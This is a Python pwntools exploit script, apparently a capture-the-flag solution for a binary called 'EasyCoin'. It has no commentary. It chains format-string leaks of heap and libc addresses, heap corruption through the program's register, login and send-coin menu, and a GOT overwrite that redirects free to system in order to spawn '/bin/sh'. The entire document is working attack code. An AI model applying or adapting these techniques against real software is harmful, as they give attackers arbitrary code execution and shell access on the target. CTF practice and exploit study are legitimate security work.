from pwn import *
import time
context(log_level='debug')
elf = ELF('./EasyCoin')
p = process(elf.path)
print proc.pidof(p)[0]
raw_input()

def register(username,passwd):
	p.sendlineafter('> ','1')
	p.sendlineafter('> ',username)
	p.sendlineafter('> ',passwd)
	p.sendlineafter('> ',passwd)

def login(username,passwd):
	p.sendlineafter('> ','2')
	p.sendlineafter('> ',username)
	p.sendlineafter('> ',passwd)

def sendcoin(username,num):
	p.sendlineafter('> ','2')
	p.sendlineafter('> ',username)
	p.sendlineafter('> ',str(num))	

register('a','a'*16+p64(47))
register('b','b')
login('b','b')
p.recvuntil('> ')
p.send('%9$p')
p.recvuntil('Command: ')
heap_addr = int(p.recvuntil('\x2d\x2d')[:-4],16) - 0xa0
print hex(heap_addr)
p.recvuntil('> ')
p.send('%2$p')
p.recvuntil('Command: ')
libc_addr = int(p.recvuntil('\x2d\x2d')[:-4],16) - 0x3c6780
print hex(libc_addr)

for i in range(0,45):
	sendcoin('b',1)
sendcoin('b',heap_addr+0x70)
p.sendlineafter('> ','6')
login('a','a'*16+p64(47))
sendcoin('b',1)
sendcoin('a',1)
p.sendlineafter('> ','5')
login('b','b')
sendcoin('b',1)
p.sendlineafter('> ','6')
register(p64(0x6030e0),p64(heap_addr+0x70)+p64(0x603018))
register('/bin/sh','a'*16+p64(heap_addr+0x12a0))
free_addr = libc_addr + 0x00000000000844f0
login('/bin/sh',p64(free_addr))
p.sendlineafter('> ','4')
system_addr = libc_addr + 0x0000000000045390
p.sendlineafter('> ',p64(system_addr))
p.sendlineafter('> ','5')
p.interactive()
